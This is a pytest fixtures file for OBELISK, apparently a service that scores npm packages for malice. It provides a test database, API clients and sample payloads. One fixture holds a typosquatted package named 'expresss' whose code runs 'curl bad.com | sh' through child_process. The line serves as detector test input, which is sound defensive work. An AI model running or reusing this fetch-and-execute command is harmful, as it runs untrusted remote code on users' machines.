"""
Shared pytest fixtures for the OBELISK test suite.

Provides database sessions, test clients, and common helpers
so individual test files don't need to set up infrastructure.
"""

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker, Session

from app.db.base import Base

# Use an in-memory SQLite database for tests — fast and isolated
TEST_DATABASE_URL = "sqlite:///./test_obelisk.db"


@pytest.fixture(scope="session")
def engine():
    """Create a test database engine that lives for the whole test run."""
    eng = create_engine(TEST_DATABASE_URL, connect_args={"check_same_thread": False})
    Base.metadata.create_all(bind=eng)
    yield eng
    Base.metadata.drop_all(bind=eng)


@pytest.fixture(autouse=True)
def _clean_tables(engine):
    """Truncate all tables before each test for proper isolation."""
    yield
    with engine.connect() as conn:
        for table in reversed(Base.metadata.sorted_tables):
            conn.execute(table.delete())
        conn.commit()


@pytest.fixture
def db_session(engine):
    """Provide a clean database session for each test function."""
    TestSession = sessionmaker(bind=engine, autocommit=False, autoflush=False)
    session = TestSession()
    try:
        yield session
    finally:
        session.rollback()
        session.close()


@pytest.fixture
def client(db_session, engine):
    """Return a FastAPI TestClient with the test DB wired in."""
    from unittest.mock import patch

    from app.api.dependencies import get_current_user, get_db
    from app.main import app

    def _override_get_db():
        try:
            yield db_session
        finally:
            pass

    app.dependency_overrides[get_db] = _override_get_db
    app.dependency_overrides[get_current_user] = lambda: {"sub": "test-user"}

    # Patch the engine used in the lifespan so it doesn't try to connect
    # to PostgreSQL; use the test SQLite engine instead.
    with patch("app.db.session.engine", engine):
        with TestClient(app) as tc:
            yield tc
    app.dependency_overrides.clear()


@pytest.fixture
def unauth_client(db_session, engine):
    """Return a TestClient with DB override only (no auth override)."""
    from unittest.mock import patch

    from app.api.dependencies import get_db
    from app.main import app

    def _override_get_db():
        try:
            yield db_session
        finally:
            pass

    app.dependency_overrides[get_db] = _override_get_db

    with patch("app.db.session.engine", engine):
        with TestClient(app) as tc:
            yield tc
    app.dependency_overrides.clear()


@pytest.fixture
def sample_package_data():
    """Standard payload for testing the /analyze endpoint."""
    return {
        "name": "expresss",
        "version": "1.0.0",
        "registry": "npm",
        "code": "const exec = require('child_process').exec; exec('curl bad.com | sh');",
    }


@pytest.fixture
def safe_package_data():
    """A safe package payload that should score low."""
    return {
        "name": "my-safe-lib",
        "version": "2.0.0",
        "registry": "npm",
        "code": "function add(a, b) { return a + b; }",
    }
